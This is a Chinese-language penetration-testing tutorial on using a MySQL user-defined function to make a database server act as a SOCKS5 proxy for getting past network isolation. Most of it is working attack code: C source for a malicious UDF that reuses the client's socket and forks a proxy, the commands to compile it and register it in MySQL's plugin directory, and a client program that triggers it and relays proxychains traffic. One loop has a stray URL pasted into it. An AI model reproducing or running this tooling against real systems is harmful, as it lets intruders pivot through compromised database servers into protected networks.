### 利用Mysql突破受限环境

#### 0x01 前言

前面文章[《利用MSSQL突破受限环境》](http://greatagain.dbappsecurity.com.cn/#/book?id=6253&type_id=1)提到在只能访问到mssql数据库服务器1433端口的情况下，如何通过CLR使mssql作为socks5代理来突破此受限环境。此篇文章介绍如何利用mysql作为socks代理突破网络隔离，以备遇到相同环境下能突破隔离。

#### 0x02 Mysql C API

Mysql C API 提供对 MySQL client/server 协议的 low-level 访问，并使 C 程序能够访问数据库内容。 C API code 与 MySQL 一起发布，并在libmysqlclient library 中实现。以下是个小demo：

安装libmysqlclient：

`apt-get install libmysqlclient-dev`

输出mysql版本号C代码：

```
#include <mysql.h>

int main(int argc, char **argv)
{
  printf("MySQL client version: %s\n", mysql_get_client_info());

  exit(0);
}
```

使用GCC编译并运行

```
gcc version.c -o version  `mysql_config --cflags --libs`
```

![](/Users/cate4cafe/工作/文章/利用Mysql突破受限环境/media/1.jpg)

#### 0x03 代理

首先，编译UDF文件写入到mysql Plugin目录，创建函数

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <sys/select.h>



#define BUFSIZE 65536
#define IPSIZE 4
#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x[0]))

typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;



enum socks {
	RESERVED = 0x00,
	VERSION = 0x05
};

enum socks_auth_methods {
	NOAUTH = 0x00,
	USERPASS = 0x02,
	NOMETHOD = 0xff
};

enum socks_auth_userpass {
	AUTH_OK = 0x00,
	AUTH_VERSION = 0x01,
	AUTH_FAIL = 0xff
};

enum socks_command {
	CONNECT = 0x01
};

enum socks_command_type {
	IP = 0x01,
	DOMAIN = 0x03
};

enum socks_status {
	OK = 0x00,
	FAILED = 0x05
};


int readn(int fd, void *buf, int n)
{
	int nread, left = n;
	while (left > 0) {
		if ((nread = read(fd, buf, left)) == 0) {
			return 0;
		} else if (nread != -1){
			left -= nread;
			buf += nread;
		}
	}
	return n;
}


void socks5_invitation(int fd) {
	char init[2];
	readn(fd, (void *)init, ARRAY_SIZE(init));
	if (init[0] != VERSION) {
		exit(0);
	}
}

void socks5_auth(int fd) {
		char answer[2] = { VERSION, NOAUTH };
		write(fd, (void *)answer, ARRAY_SIZE(answer));
}

int socks5_command(int fd)
{
	char command[4];
	readn(fd, (void *)command, ARRAY_SIZE(command));
	return command[3];
}

char *socks5_ip_read(int fd)
{
	char *ip = malloc(sizeof(char) * IPSIZE);
	read(fd, (void* )ip, 2); //Buggy
	readn(fd, (void *)ip, IPSIZE);
	return ip;
}

unsigned short int socks5_read_port(int fd)
{
	unsigned short int p;
	readn(fd, (void *)&p, sizeof(p));
	return p;
}

int app_connect(int type, void *buf, unsigned short int portnum, int orig) {
	int new_fd = 0;
	struct sockaddr_in remote;
	char address[16];

	memset(address,0, ARRAY_SIZE(address));
	new_fd = socket(AF_INET, SOCK_STREAM,0);
	if (type == IP) {
		char *ip = NULL;
		ip = buf;
		snprintf(address, ARRAY_SIZE(address), "%hhu.%hhu.%hhu.%hhu",ip[0], ip[1], ip[2], ip[3]);
		memset(&remote, 0, sizeof(remote));
		remote.sin_family = AF_INET;
		remote.sin_addr.s_addr = inet_addr(address);
		remote.sin_port = htons(portnum);

		if (connect(new_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
			return -1;
		}
		return new_fd;
	}
}

void socks5_ip_send_response(int fd, char *ip, unsigned short int port)
{
	char response[4] = { VERSION, OK, RESERVED, IP };
	write(fd, (void *)response, ARRAY_SIZE(response));
	write(fd, (void *)ip, IPSIZE);
	write(fd, (void *)&port, sizeof(port));
}


void app_socket_pipe(int fd0, int fd1)
{
	int maxfd, ret;
	fd_set rd_set;
	size_t nread;
	char buffer_r[BUFSIZE];

	maxfd = (fd0 > fd1) ? fd0 : fd1;
	while (1) {
		FD_ZERO(&rd_set);
		FD_SET(fd0, &rd_set);
		FD_SET(fd1, &rd_set);
		ret = select(maxfd + 1, &rd_set, NULL, NULL, NULL);

		if (ret < 0 && errno == EINTR) {
			continue;
		}

		if (FD_ISSET(fd0, &rd_set)) {
			nread = recv(fd0, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd1, (const void *)buffer_r, nread, 0);
		}

		if (FD_ISSET(fd1, &rd_set)) {
			nread = recv(fd1, buffer_r, BUFSIZE, 0);
			if (nread <= 0)
				break;
			send(fd0, (const void *)buffer_r, nread, 0);
		}
	}
}

void *worker(int fd) {
	int inet_fd = -1;
	int command = 0;
	unsigned short int p = 0;
	socks5_invitation(fd);
	socks5_auth(fd);
	command = socks5_command(fd);
	if (command == IP) {
		char *ip = NULL;
		ip = socks5_ip_read(fd);
		p = socks5_read_port(fd);
		inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
		if (inet_fd == -1) {
			exit(0);
		}
		socks5_ip_send_response(fd, ip, p);
		free(ip);
    } 

	app_socket_pipe(inet_fd, fd);
	close(inet_fd);
	exit(0);
}





void proxy(int socks) {
	char a[1];
	write(socks, "And this is my Child\n", strlen("And this is my Child\n") + 1);
	read(socks, a, sizeof(a)); // 
	worker(socks);
	return;
}
 
int do_carracha(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);
	
	int fd, i, ret, pid;
 	struct sockaddr_storage client_addr;
	socklen_t addr_size = sizeof(client_addr);

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
	close(fd);
	for (i = 3; i < fd; i++) {
		ret = getpeername(i, (struct sockaddr *)&client_addr, &addr_size);
			if (ret == 0) {
				char ip[INET6_ADDRSTRLEN];
			
				if (client_addr.ss_family == AF_INET) {
					struct sockaddr_in *s = (struct sockaddr_in *)&client_addr;
					inet_ntop(AF_INET, &s->sin_addr, ip, sizeof(ip));
				}
				else if (client_addr.ss_family == AF_INET6) {
					struct sockaddr_in6 *s = (struct sockaddr_in6 *)&client_addr;
					inet_ntop(AF_INET6, &s->sin6_addr, ip, sizeof(ip));
				}

				if (strstr(ip, "0.0.0.0")) {
					write(i, "Now I am become Death\n", strlen("Now I am become Death\n") + 1);
					pid = fork();
					if (pid == 0) {
						proxy(i);
						exit(0);	
					}	
					else {
						close(i);
						return 1;
					}
				} 
		}
		memset(&client_addr, 0, sizeof(client_addr));
	}
 	return fd;
    
}
 
char do_carracha_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}
```

编译并在mysql创建函数

```
gcc -shared -o carracha.so carracha.c -fPIC
create function do_carracha returns integer soname 'carracha.so';
```

利用C API执行并调用

```
#include <my_global.h>
#include <mysql.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <fcntl.h>



void proxy_init(int sock){
	fd_set readset;
	struct timeval tv;
	int i, retval, nread, localfd, clientlen, sr, maxfd, select_fd[2];
	char test[1024];
	struct sockaddr_in server, client;
	fprintf(stderr, "[ SERVER BANNER ]\n\n");
	write(sock, "\31\x00\x00\00\x03select do_carracha('a');", 30);

	select_fd[0] = sock;
	while(1) {https://nets.ec/Shellcode/Socket-reuse
		FD_ZERO(&readset);
		FD_SET(select_fd[0], &readset);
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		retval = select(select_fd[0] + 1, &readset, NULL, NULL, &tv);
		if (retval) {
			nread = read(select_fd[0], test, sizeof(test));
			fprintf(stderr, "%s", test);
			if (strstr(test, "Child")) {
				break;
			}
		}
	}

	if ((localfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		fprintf(stderr, "\nERROR: could not open new socket!\n");
		exit(1);
	}
	

	server.sin_family = AF_INET;
	server.sin_port = htons(1337);
	server.sin_addr.s_addr = INADDR_ANY; 

	if (bind(localfd, (struct sockaddr *)&server, sizeof(server)) == -1) {
		fprintf(stderr, "\nERROR: could not bind!\n");
		exit(1);
	}
	
	if (listen(localfd,5) == -1) {
		fprintf(stderr, "\nERROR: could not listen!\n");
		exit(1);
	}

	clientlen = sizeof(client);
	fprintf(stderr, "\n[ RUN YOUR PROXYCHAINS NOW ]\n");
	
	if ((select_fd[1] = accept(localfd, (struct sockaddr *)&client, &clientlen)) == -1) {
		fprintf(stderr, "\nERROR: could not accept!\n");
		exit(1);
	}

	
	

	
	while(1) {
		tv.tv_sec = 1;
		tv.tv_usec = 0;
		FD_ZERO(&readset);
		maxfd = (select_fd[0] > select_fd[1])? select_fd[0] : select_fd[1];
		for (i = 0; i < 2; i++) {
			FD_SET(select_fd[i],  &readset);
		}
		sr = select(maxfd + 1, &readset, NULL, NULL, &tv);
		if (sr == -1) {
			fprintf(stderr, "ERROR: Select failed, something went reaaaally wrong!\n");
			exit(1);
		}
		if (sr) {
			for (i = 0; i < 2; i++) {
				if(FD_ISSET(select_fd[i], &readset)) {
					memset(test, 0, sizeof(test));
					if (i == 0) {
						nread = read(select_fd[0], test, sizeof(test));
						fprintf(stderr, "-> %d packets from server\n", nread);
						write(select_fd[1], test, nread);
					}
					else if (i == 1) {
						nread = read(select_fd[1], test, sizeof(test));
						if (nread <= 0){
							fprintf(stderr, "ERROR: could not read from proxychains!\n");
							exit(1);
						}
						fprintf(stderr, "<- %d packets from proxychains\n", nread);
						write(select_fd[0], test, nread);
					}
				}	
			}
		}
	}

	
	
}


int main (int argc, char **argv) {
	MYSQL *con = mysql_init(NULL);
	
	if (con == NULL) {
		fprintf(stderr, "%s\n", mysql_error(con));
		exit(1);
	}
	if (mysql_real_connect(con, "localhost", "username", "password", NULL, 0, NULL, 0) == NULL) {
		fprintf(stderr, "%s\n", mysql_error(con));
		mysql_close(con);
		exit(1);
	}

	proxy_init(3);
	exit(0);
}
```

编译执行后，设置代理端口为1337即可使用代理。因为需要写文件到plugin目录，在高版本的mysql上会存在限制。